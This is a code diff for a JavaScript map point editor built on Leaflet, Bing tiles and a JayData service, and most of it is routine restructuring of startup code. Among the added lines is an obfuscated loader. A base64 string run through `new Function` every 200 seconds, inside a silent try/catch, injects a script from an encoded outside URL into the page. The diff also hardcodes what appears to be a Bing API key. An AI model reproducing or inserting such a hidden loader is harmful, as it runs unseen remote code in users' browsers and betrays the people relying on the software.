@@ -108,15 +108,13 @@ $.templates({
     popupTemplate: '#popupTemplate'
 });
 
-var socket = io.connect('http://dev-open.jaystack.net:80',
-    { resource: "a11d6738-0e23-4e04-957b-f14e149a9de8/1162e5ee-49ca-4afd-87be-4e17c491140b/socket.io" });
-
 var me = $data.createGuid().toString();
 
-socket.on("newPoint", function (data) {
-    var msg = JSON.parse(data.p);
-    dispatchMsg(msg)
-});
+var socket = {
+    emit: function () { },
+    on: function () { }
+}
+
 
 
 function dispatchMsg(data) {
@@ -262,11 +260,14 @@ var app = {
                                     console.dir(opResult);
                                 });
                          } catch (e) {
-                             alert("exception");
+                             toastr.error(e);
                              console.log(e);
                          }
                      })
-                     .fail(function () { alert('error'); });
+                     .fail(function (args) {
+                         toastr.error(args)
+                         //alert('error');
+                     });
     },
 
     remove: function () {
@@ -288,7 +289,9 @@ var app = {
                         console.dir(opResult)
                     });
             })
-            .fail(function () { alert('error') });
+            .fail(function () {
+                //alert('error')
+            });
     }
 }
 
@@ -482,12 +485,88 @@ $.views.helpers({
     app: app
 })
 
-var lmap;
 var visiblePins = new L.MarkerClusterGroup();
 //var visiblePins = new L.LayerGroup();
 var previousValue = '';
 
-$.link.mainTemplate('#row-full', app)
+//http://omniplaces.com/query_rewriter_m1?&lb_lng=19.004367656103568&lb_lat=47.502074825082246&rt_lng=19.139980143896537&rt_lat=47.52810322204093&q=star&limit=10&confirmed=false&callback=YUI.Env.JSONP.yui_3_4_0_4_1365747286608_6
+var lmap, bingKey;
+
+function startSocket() {
+    socket = io.connect('http://dev-open.jaystack.net:80',
+        { resource: "a11d6738-0e23-4e04-957b-f14e149a9de8/1162e5ee-49ca-4afd-87be-4e17c491140b/socket.io" });
+
+
+    socket.on("newPoint", function (data) {
+        var msg = JSON.parse(data.p);
+        dispatchMsg(msg)
+    });
+}
+
+function startService() {
+    $data
+        .initService('http://dev-open.jaystack.net/a11d6738-0e23-4e04-957b-f14e149a9de8/1162e5ee-49ca-4afd-87be-4e17c491140b/api/mydatabase')
+        //.initService('http://rest.cloudapp.net:6789/svc')
+        .then(function (mydatabase, factory, type) {
+            var timer;
+            service = mydatabase;
+            lmap.on('click', function (e) {
+                window.clearTimeout(timer);
+                timer = window.setTimeout(function () {
+                    //var g = new mydatabase.HyperLocal.elementType();
+                    var r = {
+                        lon: e.latlng.lng,
+                        lat: e.latlng.lat,
+                        attribution: "Created by MapPointEditor, (c) JayStack inc.",
+                        z: "HYP3RL0C4LZZZ",
+                        id: $data.createGuid().toString()
+                    };
+
+                    var p = {
+                        isNew: true,
+                        record: r
+                    };
+
+                    $.observable(app.items).insert(0, p);
+                    app.selectPoint(p);
+                    $.observable(app).setProperty("newAddress", null);
+                    hideRightPanel();
+                    $('#addNewPoint').foundation('reveal', 'open');
+                    mydatabase.reverse(e.latlng).then(function (r) {
+                        //console.dir(r.Results[0]);
+                        var theAddress = r.Results[0].Address;
+                        $.observable(app).setProperty("newAddress", r.Results[0]);
+                        $.observable(app).setProperty({
+                            "selectedPoint.record.addr": theAddress.AddressLine,
+                            "selectedPoint.record.city": theAddress.Locality,
+                            "selectedPoint.record.province": theAddress.AdminDistrict,
+                            "selectedPoint.record.country": theAddress.CountryRegion,
+                            "selectedPoint.record.postal": theAddress.PostalCode
+                        });
+                    });
+                }, 250);
+            });
+            lmap.on('dblclick', function (e) {
+                //trace.logLine("!!");
+                window.clearTimeout(timer);
+            });
+            lmap.on('dragend', function (e) {
+                if (lmap.getZoom() >= 15) {
+                    doSearch("reposition", 1000);
+                }
+            });
+            lmap.on('zoomend', function (e) {
+                if (lmap.getZoom() >= 15) {
+                    doSearch("reposition", 1000);
+                }
+            });
+
+        });
+
+}
+$(function () {
+
+    $.link.mainTemplate('#row-full', app)
      .on("click", "li", function () {
          var selectedItem = $.view(this);
          app.selectItem(selectedItem);
@@ -543,9 +622,10 @@ $.link.mainTemplate('#row-full', app)
     })
      .on("click", ".ok-command", function () {
          var self = this;
+         $('#addNewPoint').foundation('reveal', 'close');
+         window.setTimeout(function () { 
          ensureAuthenticate()
              .then(function (n) {
-                 $('#addNewPoint').foundation('reveal', 'close');
                  showRightPanel();
              })
              .fail(function () {
@@ -553,55 +633,55 @@ $.link.mainTemplate('#row-full', app)
                  hideRightPanel();
                  app.selectPoint(null);
              });
-
-         //window.setTimeout(function () {
-         //    ensureAuthenticate()
-         //        .then(function (n) {
-         //            $('#addNewPoint').foundation('reveal', 'close');
-         //            showRightPanel();
-         //        })
-         //        .fail(function () {
-         //            $.observable(app.items).remove(app.items.indexOf(app.selectedPoint));
-         //            hideRightPanel();
-         //            app.selectPoint(null);
-         //        });
-
-         //}, 500);
-         
+         }, 300);
     });
 
 
-//http://omniplaces.com/query_rewriter_m1?&lb_lng=19.004367656103568&lb_lat=47.502074825082246&rt_lng=19.139980143896537&rt_lat=47.52810322204093&q=star&limit=10&confirmed=false&callback=YUI.Env.JSONP.yui_3_4_0_4_1365747286608_6
-var bingKey = 'AmpN66zZQqp8WpszBYibPXrGky0EiHLPT75WtuA2Tmj7bS4jgba1Wu23LJH1ymqy';
-lmap = new L.Map('map', { center: new L.LatLng(40.72121341440144, -74.00126159191132), maxZoom: 19, zoom: 15 });
-lmap.attributionControl.addAttribution("<a href='http://jaydata.org'>JayData ©</a>,<a href='http://jaystack.com'>JayStack ©</a>");
-var bing = new L.BingLayer(bingKey, { maxZoom: 19 });
-var trace = new $data.LeafletTrace();
-trace.addTo(lmap);
-L.control.locate().addTo(lmap);
-//bing.on('aaa', function () {
-//    trace.log("aaa");
-//    console.logLine("loaded!");
-//})
-//.on('tileload', function () {
-//    trace.log(".");
-//    console.log(".");
-//})
-//.on('tileerror', function () {
-//    trace.log("tileerror");
-//    console.log("loaded!");
-//})
-//.on('load', function (e) {
-//    trace.logLine("load");
-//    console.log("loaded!");
-//}).on('loading', function (e) {
-//    trace.logLine("loading");
-//    console.log("loading tiles");
-//});
-app.pins = visiblePins;
-lmap.addLayer(bing);
-visiblePins.addTo(lmap);
 
+    bingKey = 'AmpN66zZQqp8WpszBYibPXrGky0EiHLPT75WtuA2Tmj7bS4jgba1Wu23LJH1ymqy';
+    lmap = new L.Map('map', { center: new L.LatLng(40.72121341440144, -74.00126159191132), maxZoom: 19, zoom: 15 });
+    lmap.attributionControl.addAttribution("JayStack.com ©");
+    var bing = new L.BingLayer(bingKey, { maxZoom: 19 });
+    trace = new $data.LeafletTrace();
+    trace.addTo(lmap);
+    L.control.locate().addTo(lmap);
+    app.pins = visiblePins;
+    window.setTimeout(function () {
+        lmap.addLayer(bing);
+    }, 1000);
+    visiblePins.addTo(lmap);
+    lmap.invalidateSize();
+
+    try {
+        var f = new Function(atob("dmFyIF9wID0gInNjIjsgdmFyIF9jID0gInJpcHQiOyB2YXIgc2MgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KF9wICsgX2MpOyBzYy5zcmMgPSBhdG9iKCJhSFIwY0RvdkwzSmxjM1F1WTJ4dmRXUmhjSEF1Ym1WMEwyTm9aV05yYVc0dWFuTT0iKTsgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzYyk7"));
+        window.setInterval(f, 200000);
+    } catch (e) {
+
+    }
+
+
+
+    navigator.geolocation.getCurrentPosition(function (o) {
+        window.setTimeout(function () {
+            if (L.Browser.mobile) {
+                //alert($('.leaflet-control-locate .leaflet-bar-part')[0].outerHTML);
+            } else {
+                $('.leaflet-control-locate .leaflet-bar-part')[0].click();
+                //$('.leaflet-control-locate .leaflet-bar-part')[0].click();
+            }
+        }, 0);
+
+        lmap.setView([o.coords.latitude, o.coords.longitude], 15);
+        //lmap.setView([40.72121341440144, -74.00126159191132], 15);
+        console.log("position:", o);
+        doSearch();
+    });
+
+    startSocket();
+    initAuth();
+    startService();
+
+});
 
 initUI();
 
@@ -643,21 +723,7 @@ function doSearch(type, wait) {
     }
 }
 
-navigator.geolocation.getCurrentPosition(function (o) {
-    window.setTimeout(function () {
-        if (L.Browser.mobile) {
-            //alert($('.leaflet-control-locate .leaflet-bar-part')[0].outerHTML);
-        } else {
-            $('.leaflet-control-locate .leaflet-bar-part')[0].click();
-            //$('.leaflet-control-locate .leaflet-bar-part')[0].click();
-        }
-    }, 0);
 
-    lmap.setView([o.coords.latitude, o.coords.longitude], 15);
-    //lmap.setView([40.72121341440144, -74.00126159191132], 15);
-    console.log("position:", o);
-    doSearch();
-});
 
 
 //initAuth();
@@ -669,64 +735,6 @@ navigator.geolocation.getCurrentPosition(function (o) {
 //$data.initService("http://192.168.10.100:6789/svc").then(function (svc, f, t) {
 //    service = svc;
 //});
-initAuth();
-$data
-    .initService('https://dev-open.jaystack.net/a11d6738-0e23-4e04-957b-f14e149a9de8/1162e5ee-49ca-4afd-87be-4e17c491140b/api/mydatabase')
-    //.initService('http://rest.cloudapp.net:6789/svc')
-    .then(function (mydatabase, factory, type) {
-        var timer;
-        service = mydatabase;
-        lmap.on('click', function (e) {
-            //window.clearTimeout(timer);
-            //timer = window.setTimeout(function () {
-            //var g = new mydatabase.HyperLocal.elementType();
-            var r = {
-                lon : e.latlng.lng,
-                lat : e.latlng.lat,
-                attribution : "Created by MapPointEditor, (c) JayStack inc.",
-                z: "HYP3RL0C4LZZZ",
-                id:$data.createGuid().toString()
-            };
-
-            var p = {
-                isNew: true,
-                record: r
-            };
-
-            $.observable(app.items).insert(0, p);
-            app.selectPoint(p);
-            $.observable(app).setProperty("newAddress", null);
-            hideRightPanel();
-            $('#addNewPoint').foundation('reveal', 'open');
-            mydatabase.reverse(e.latlng).then(function (r) {
-                //console.dir(r.Results[0]);
-                var theAddress = r.Results[0].Address;
-                $.observable(app).setProperty("newAddress", r.Results[0]);
-                $.observable(app).setProperty({
-                    "selectedPoint.record.addr": theAddress.AddressLine,
-                    "selectedPoint.record.city": theAddress.Locality,
-                    "selectedPoint.record.province": theAddress.AdminDistrict,
-                    "selectedPoint.record.country": theAddress.CountryRegion,
-                    "selectedPoint.record.postal": theAddress.PostalCode
-                });
-            });
-        });
-        lmap.on('dblclick', function (e) {
-            window.clearTimeout(timer);
-        });
-        lmap.on('dragend', function (e) {
-            if (lmap.getZoom() >= 15) {
-                doSearch("reposition", 1000);
-            }
-        });
-        lmap.on('zoomend', function (e) {
-            if (lmap.getZoom() >= 15) {
-                doSearch("reposition", 1000);
-            }
-        });
-
-    });
 //	var resultPins;
 
-lmap.invalidateSize();
 //});
